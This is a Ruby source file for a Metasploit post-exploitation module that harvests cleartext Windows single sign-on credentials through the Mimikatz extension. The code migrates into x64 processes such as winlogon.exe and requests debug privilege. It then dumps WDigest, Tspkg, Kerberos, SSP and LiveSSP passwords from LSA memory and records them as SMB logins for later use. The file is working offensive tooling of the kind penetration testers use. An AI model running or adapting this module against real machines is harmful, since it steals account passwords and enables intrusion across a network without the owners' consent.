##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/post/windows/priv'

class Metasploit3 < Msf::Post

  include Msf::Post::Windows::Priv
  include Msf::Auxiliary::Report

  def initialize(info={})
    super( update_info(info,
      'Name'         => 'Windows Single Sign On Credential Collector (Mimikatz)',
      'Description'  => %q{
        This module will collect cleartext Single Sign On credentials from the Local
      Security Authority using the Mimikatz extension. Blank passwords will not be stored
      in the database.
          },
      'License'      => MSF_LICENSE,
      'Author'       => ['Ben Campbell'],
      'Platform'     => ['win'],
      'SessionTypes' => ['meterpreter']
    ))
    register_options([
      OptBool.new('MIGRATE', [false, 'Migrate to x64 process', false])
    ])
  end

  def run
    if sysinfo.nil?
      print_error('This module is only available in a windows meterpreter session.')
      return
    end

    print_status("Running module against #{sysinfo['Computer']}")
    if (client.platform =~ /x86/) && (client.sys.config.sysinfo['Architecture'] =~ /x64/)
      if datastore['MIGRATE']
        print_status('Running on x86 trying to migrate to a x64 process')
        processes = client.sys.process.get_processes
        uid = client.sys.config.getuid
        possible_procs = gather_procs(processes, uid)
        possible_procs.each do |proc|
          break if attempt_migration(proc['pid'])
        end
        if client.platform =~ /x86/
          print_error("Couldn't migrate to x64 process")
          return
        end
      else
        print_error('x64 platform requires x64 meterpreter and mimikatz extension')
        return
      end
    end

    unless client.mimikatz
      vprint_status('Loading mimikatz extension...')
      begin
        client.core.use('mimikatz')
      rescue Errno::ENOENT
        print_error('This module is only available in a windows meterpreter session.')
        return
      end
    end

    unless is_system?
      vprint_warning('Not running as SYSTEM')
      debug = client.mimikatz.send_custom_command('privilege::debug')
      if debug =~ /Not all privileges or groups referenced are assigned to the caller/
        print_error('Unable to get Debug privilege')
        return
      else
        vprint_status('Retrieved Debug privilege')
      end
    end

    vprint_status('Retrieving WDigest')
    res = client.mimikatz.wdigest
    vprint_status('Retrieving Tspkg')
    res.concat client.mimikatz.tspkg
    vprint_status('Retrieving Kerberos')
    res.concat client.mimikatz.kerberos
    vprint_status('Retrieving SSP')
    res.concat client.mimikatz.ssp
    vprint_status('Retrieving LiveSSP')
    livessp = client.mimikatz.livessp
    unless livessp.first[:password] =~ /livessp KO/
      res.concat client.mimikatz.livessp
    else
      vprint_error('LiveSSP credentials not present')
    end

    table = Rex::Ui::Text::Table.new(
      'Header' => 'Windows SSO Credentials',
      'Indent' => 0,
      'SortIndex' => 0,
      'Columns' =>
      [
        'AuthID', 'Package', 'Domain', 'User', 'Password'
      ]
    )

    unique_results = res.index_by { |r| "#{r[:authid]}#{r[:user]}#{r[:password]}" }.values

    unique_results.each do |result|
      next if is_system_user? result[:user]
      table << [result[:authid], result[:package], result[:domain], result[:user], result[:password]]
      report_creds(result[:domain], result[:user], result[:password])
    end

    print_line table.to_s
  end

  def report_creds(domain, user, pass)
    return if (user.empty? or pass.empty?)
    return if pass.include?('n.a.')

    # Assemble data about the credential objects we will be creating
    credential_data = {
      origin_type: :session,
      post_reference_name: self.refname,
      private_data: pass,
      private_type: :password,
      session_id: session_db_id,
      username: user,
      workspace_id: myworkspace_id
    }

    unless domain.blank?
      credential_data[:realm_key]   = Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN
      credential_data[:realm_value] = domain
    end

    credential_core = create_credential(credential_data)

    # Assemble the options hash for creating the Metasploit::Credential::Login object
    login_data = {
      core: credential_core,
      status: Metasploit::Model::Login::Status::UNTRIED,
      address: ::Rex::Socket.getaddress(session.sock.peerhost, true),
      port: 445,
      service_name: 'smb',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    create_credential_login(login_data)
  end

  def is_system_user?(user)
    system_users = [
      /^$/,
      /^DWM-\d$/,
      /^ASPNET$/,
      /^ASP\.NET V2\.0 Integrated$/,
      /^ANONYMOUS LOGON$/,
      /^IUSR.*/,
      /^IWAM.*/,
      /^IIS_WPG$/,
      /.*\$$/,
      /^LOCAL SERVICE$/,
      /^NETWORK SERVICE$/,
      /^LOCAL SYSTEM$/
    ]

    return system_users.find { |r| user.match(r) }
  end

  def gather_procs(processes, uid)
    possible_procs = []
    processes.each do |proc|
      if proc['name'] == 'explorer.exe' && proc['user'] == uid
        possible_procs << proc
      elsif proc['name'] == 'explorer.exe' && proc['user'] != uid
        possible_procs << proc
      elsif proc['name'] == 'winlogon.exe'
        possible_procs << proc
      end
    end
    possible_procs
  end

  def attempt_migration(target_pid)
    print_good("Migrating to #{target_pid}")
    client.core.migrate(target_pid)
    print_good("Successfully migrated to process #{target_pid}")
    return true
  rescue ::Exception => e
    print_error('Could not migrate in to process.')
    print_error(e.to_s)
    return false
  end
end
